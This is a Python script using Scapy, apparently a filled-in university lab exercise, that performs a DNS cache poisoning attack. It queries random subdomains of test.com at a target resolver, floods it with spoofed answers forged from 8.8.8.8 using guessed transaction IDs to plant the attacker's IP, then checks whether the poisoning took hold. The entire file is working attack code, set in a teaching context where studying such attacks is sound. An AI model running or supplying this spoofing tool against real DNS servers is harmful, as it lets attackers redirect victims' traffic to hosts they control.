#! usr/bin/python3
#FIT3031 Teaching Team

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 10000
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.10.10.197"     # complete attacker's IP

#IP of our victim's dns server
target_dns_ip =  "10.10.5.53"  # complete DNS server's IP

#DNS Forwarder if local couldn't resolve 
#or real DNS of the example.com
forwarder_dns = "8.8.8.8" 

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

#target dns port
target_dns_port = 33333

# Step 1: Create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# Each dummy host should concat random substrings in dummy_domain_prefix and base_domain
for _ in range(ATTEMPT_NUM):
    random_prefix = ''.join(random.choice(dummy_domain_prefix) for _ in range(10))
    dummy_domain_lst.append(random_prefix + base_domain)

print("Completed generating dummy domains")

#### ATTACK SIMULATION ####

for i in range(0, ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    ###### Step 2: Generate a random DNS query for cur_domain to challenge the local DNS
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025, 65535), dport=53)
    DNSpkt = DNS(id=random.randint(0, 65535), rd=1, qd=DNSQR(qname=cur_domain))
    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt, verbose=0)

    ###### Step 3: For that DNS query, generate 100 random guesses with random transactionID 
    # to spoof the response packet
    for j in range(100):
        tran_id = random.randint(0, 65535)

        IPpkt = IP(src=forwarder_dns, dst=target_dns_ip)
        UDPpkt = UDP(sport=53, dport=target_dns_port)
        DNSpkt = DNS(id=tran_id, qr=1, aa=1, qd=DNSQR(qname=cur_domain), an=DNSRR(rrname=cur_domain, rdata=attacker_ip))
        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt, verbose=0)

    ####### Step 4: Verify the result by sending a DNS query to the server 
    # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025, 65000), dport=53)
    DNSpkt = DNS(id=99, rd=1, qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt, timeout=2, retry=0, verbose=0)
    try:
        if z and z.haslayer(DNS) and z[DNS].an and z[DNS].an.rdata == attacker_ip:
            print("Poisoned the victim DNS server successfully.")
            break
    except:
        print("Poisoning failed")

#### END ATTACK SIMULATION ####
